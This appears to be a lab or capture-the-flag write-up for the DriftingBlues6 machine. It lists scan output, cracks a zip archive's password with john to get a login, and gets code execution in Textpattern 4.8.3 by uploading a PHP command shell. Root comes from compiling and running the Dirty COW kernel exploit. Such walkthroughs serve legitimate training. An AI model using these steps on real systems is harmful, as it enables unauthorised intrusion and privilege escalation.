# DriftingBlues6

***

IP=192.168.192.219

## NMAP

| PORT   | STATE | SERVICE |
| ------ | ----- | ------- |
| 80/tcp | open  | http    |

```perl
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.2.22 ((Debian))
|_http-title: driftingblues
| http-robots.txt: 1 disallowed entry 
|_/textpattern/textpattern
|_http-server-header: Apache/2.2.22 (Debian)
```

## 80 - http

### /robots.txt

```txt
User-agent: *
Disallow: /textpattern/textpattern

dont forget to add .zip extension to your dir-brute
;)
```

### /spammer.zip

```bash
zip2john spammer.zip > hash
john --wordlist=rockyou.txt hash
unzip spammer.zip
myspace4
```

> mayer:lionheart

### /textpattern/textpattern

Textpattern CMS (v4.8.3)

```bash
searchsploit textpattern
```

```txt
RCE

1) Go to content section .
2) Click Files and upload malicious php file.
3) go to yourserver/textpattern/files/yourphp.php?cmd=yourcode;

```

## PrivEsc

### Linux Kernel 2.6.22 < 3.9 - 'Dirty COW' 'PTRACE\_POKEDATA' Race Condition Privilege Escalation (/etc/passwd Method)

```bash
uname -a
```

3.2.0-4-amd64

https://www.exploit-db.com/exploits/40839

```bash
gcc -pthread 40839.c -o dirty -lcrypt
chmod +x dirty
./dirty
```
